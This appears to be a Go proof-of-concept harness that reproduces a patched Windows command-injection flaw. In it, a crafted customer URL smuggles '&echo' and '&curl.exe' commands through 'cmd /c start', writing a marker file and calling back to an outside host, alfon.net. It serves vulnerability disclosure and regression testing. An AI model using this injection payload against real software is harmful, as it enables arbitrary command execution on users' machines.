// Command repro_windows_openurl reproduces the v0.1.2 Windows OpenURL sink:
// exec.Command("cmd", "/c", "start", "", url) with a customer-ID-shaped
// payload. Current main uses ShellExecuteW instead; this binary talks to
// cmd.exe directly so the unpatched parser can be observed on a GHA runner.
//
// The payload writes a local marker and GETs http://alfon.net?g<run_id>.
// It does not read files or send secrets.
package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

func main() {
	if runtime.GOOS != "windows" {
		fmt.Fprintln(os.Stderr, "windows only")
		os.Exit(2)
	}

	runID := os.Getenv("GITHUB_RUN_ID")
	if runID == "" {
		runID = "local"
	}

	cwd, err := os.Getwd()
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	marker := filepath.Join(cwd, "RCBB_CLI_EXECUTED.txt")
	httpBody := filepath.Join(cwd, "RCBB_HTTP.txt")
	_ = os.Remove(marker)
	_ = os.Remove(httpBody)

	// No spaces, tabs, or quotes: Go's EscapeArg would otherwise quote the
	// whole URL and cmd.exe would not treat & as a command separator.
	url := "https://app.revenuecat.com/projects/x/customers/rcbb" +
		`&echo>%CD%\RCBB_CLI_EXECUTED.txt` +
		`&curl.exe,-s,-o,%CD%\RCBB_HTTP.txt,http://alfon.net?g` + runID

	fmt.Printf("run_id=%s\n", runID)
	fmt.Printf("lookup=http://alfon.net?g%s\n", runID)
	fmt.Printf("url=%s\n", url)
	fmt.Printf("::notice::alfon.net query g%s\n", runID)

	cmd := exec.Command("cmd", "/c", "start", "", url)
	cmd.Dir = cwd
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "cmd.Run: %v\n", err)
	}

	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(marker); err == nil {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}

	if _, err := os.Stat(marker); err != nil {
		fmt.Fprintln(os.Stderr, "FAIL: marker not created; & split did not run")
		os.Exit(1)
	}
	fmt.Println("PASS: local marker created (cmd.exe parsed &)")

	if b, err := os.ReadFile(httpBody); err != nil {
		fmt.Fprintln(os.Stderr, "WARN: no HTTP body; check alfon.net or Cloudflare")
	} else {
		fmt.Printf("http_body_len=%d\n", len(b))
		if len(b) > 256 {
			b = b[:256]
		}
		fmt.Printf("http_body_head=%q\n", b)
	}
}
